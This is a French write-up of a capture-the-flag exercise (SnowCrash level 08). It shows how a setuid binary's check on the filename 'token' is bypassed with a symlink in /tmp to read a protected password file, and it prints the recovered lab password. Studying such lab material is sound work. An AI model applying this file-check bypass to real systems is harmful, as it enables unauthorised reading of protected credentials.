# Level 08

```bash
level08@SnowCrash:~$ ls -l
total 16
-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
-rw-------  1 flag08 flag08    26 Mar  5  2016 token
```
```bash
level08@SnowCrash:~$ ./level08 token
You may not access 'token'
```

```bash
level08@SnowCrash:~$ strings level08 | head -n 25
/lib/ld-linux.so.2
__gmon_start__
libc.so.6
_IO_stdin_used
exit
__stack_chk_fail
printf
strstr
read
open
__libc_start_main
write
GLIBC_2.4
GLIBC_2.0
PTRh 
QVhT
UWVS
[^_]
%s [file to read]
token
You may not access '%s'
Unable to open %s
Unable to read fd %d
;*2$"
GCC: (Ubuntu/Linaro 4.6.3-1ubuntu5) 4.6.3
```

Grace au ligne 'strstr' 'read' 'open' 'token', on assume que l'executable 'level08' prends un fichier en parametre et que si ce fichier a pour nom token il nous renvoie un message d'erreur et n'ouvre pas le ficher

On va donc contourner en creant un lien symbolique de ce fichier avec un nom different dans le repertoire /tmp (vu qu'on a les permissions de creer un fichier)

```bash
level08@SnowCrash:~$ ln -s /home/user/level08/token /tmp/flag
level08@SnowCrash:~$ readlink -f /tmp/flag
/home/user/level08/token
level08@SnowCrash:~$ ls -l /tmp/flag
lrwxrwxrwx 1 level08 level08 24 Nov 27 16:56 /tmp/flag -> /home/user/level08/token
level08@SnowCrash:~$ ./level08 /tmp/flag
quif5eloekouj29ke0vouxean
level08@SnowCrash:~$ su flag08
Password: 
Don't forget to launch getflag !
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : *****************
```